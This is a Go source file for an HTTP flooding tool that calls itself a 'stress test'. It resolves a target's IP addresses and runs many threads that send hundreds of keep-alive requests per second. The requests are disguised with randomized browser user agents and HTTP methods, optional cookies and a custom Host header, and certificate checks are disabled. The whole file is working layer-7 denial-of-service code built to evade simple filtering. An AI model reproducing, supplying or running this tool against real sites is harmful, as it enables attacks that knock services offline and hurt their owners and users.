package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"
)

var (
	ip            string
	ips           []string // List of resolved IPs for DNS Randomization
	port          int
	path          string
	threads       int
	timer         int
	cookie        string
	customHost    string
	httpMethods   = []string{"GET", "POST", "HEAD"} // Random HTTP methods
	basePath      string
	platformChoices = []string{"Macintosh", "Windows", "X11", "Linux", "iPhone", "Android"}

	macOSVersions   = []string{"68K", "PPC", "Intel Mac OS X 10_15_7", "Intel Mac OS X 11_2_3"}
	windowsVersions = []string{"WinNT4.0", "Windows NT 10.0; Win64; x64"}
	linuxVersions   = []string{"Linux x86_64", "Ubuntu; Linux x86_64"}
	androidVersions = []string{"Android 11; Pixel 5"}
	iphoneVersions  = []string{"iPhone; CPU iPhone OS 15_1 like Mac OS X"}

	browsers = []string{"chrome", "firefox", "edge"}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func resolveDNS(hostname string) {
	addrs, err := net.LookupIP(hostname)
	if err != nil {
		fmt.Println("Failed to resolve DNS:", err)
		os.Exit(1)
	}

	for _, addr := range addrs {
		if ipv4 := addr.To4(); ipv4 != nil {
			ips = append(ips, ipv4.String())
		}
	}

	if len(ips) == 0 {
		fmt.Println("No valid IP addresses resolved!")
		os.Exit(1)
	}

	fmt.Printf("Resolved IPs: %v\n", ips)
}

func getUserAgent() string {
	platform := platformChoices[rand.Intn(len(platformChoices))]
	var os string

	switch platform {
	case "Macintosh":
		os = macOSVersions[rand.Intn(len(macOSVersions))]
	case "Windows":
		os = windowsVersions[rand.Intn(len(windowsVersions))]
	case "X11", "Linux":
		os = linuxVersions[rand.Intn(len(linuxVersions))]
	case "Android":
		os = androidVersions[rand.Intn(len(androidVersions))]
	case "iPhone":
		os = iphoneVersions[rand.Intn(len(iphoneVersions))]
	}

	browser := browsers[rand.Intn(len(browsers))]
	version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))

	switch browser {
	case "chrome":
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, version)
	case "firefox":
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.0", os, rand.Intn(99), rand.Intn(99))
	default:
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36", os)
	}
}

func getHeader(method string) string {
	hostHeader := ip
	if customHost != "" {
		hostHeader = customHost
	}

	header := fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path)
	header += fmt.Sprintf("Host: %s\r\n", hostHeader)
	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
	header += "Accept: */*\r\n"
	header += "Accept-Encoding: gzip, deflate\r\n"
	header += "Connection: keep-alive\r\n"
	if method == "POST" {
		header += "Content-Length: 0\r\n"
	}
	if cookie != "" {
		header += fmt.Sprintf("Cookie: %s\r\n", cookie)
	}
	header += "\r\n"
	return header
}

func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
	defer wg.Done()

	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: customHost}
	for count := range requestCount {
		for {
			randomIP := ips[rand.Intn(len(ips))] // Pick a random resolved IP
			address := fmt.Sprintf("%s:%d", randomIP, port)

			var conn net.Conn
			var err error
			if port == 443 {
				conn, err = tls.Dial("tcp", address, tlsConfig)
			} else {
				conn, err = net.Dial("tcp", address)
			}

			if err != nil {
				fmt.Printf("Worker %d: connection error: %v\n", id, err)
				time.Sleep(time.Second)
				continue
			}

			method := httpMethods[rand.Intn(len(httpMethods))] // Random HTTP method
			header := getHeader(method)

			for i := 0; i < count; i++ {
				time.Sleep(time.Millisecond * time.Duration(rand.Intn(80)))
				_, err := conn.Write([]byte(header))
				if err != nil {
					fmt.Printf("Worker %d: write error: %v\n", id, err)
					break
				}
			}
			conn.Close()
			break
		}
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: <URL> <THREADS> <TIMER> [CUSTOM_HOST]")
		return
	}

	parsedURL, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println("Invalid URL:", err)
		return
	}

	ip = parsedURL.Hostname()
	if parsedURL.Port() != "" {
		port, _ = strconv.Atoi(parsedURL.Port())
	} else if parsedURL.Scheme == "https" {
		port = 443
	} else {
		port = 80
	}

	path = parsedURL.Path
	if path == "" {
		path = "/"
	}

	threads, _ = strconv.Atoi(os.Args[2])
	timer, _ = strconv.Atoi(os.Args[3])
	if len(os.Args) > 4 {
		customHost = os.Args[4]
	}

	resolveDNS(ip)

	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
	if customHost != "" {
		fmt.Printf("Using custom Host header: %s\n", customHost)
	}

	var wg sync.WaitGroup
	requestCount := make(chan int, threads)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(i, &wg, requestCount)
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for t := 0; t < timer; t++ {
			<-ticker.C
			for i := 0; i < threads; i++ {
				requestCount <- 200
			}
		}
		close(requestCount)
	}()

	wg.Wait()
	fmt.Println("Stress test completed.")
}
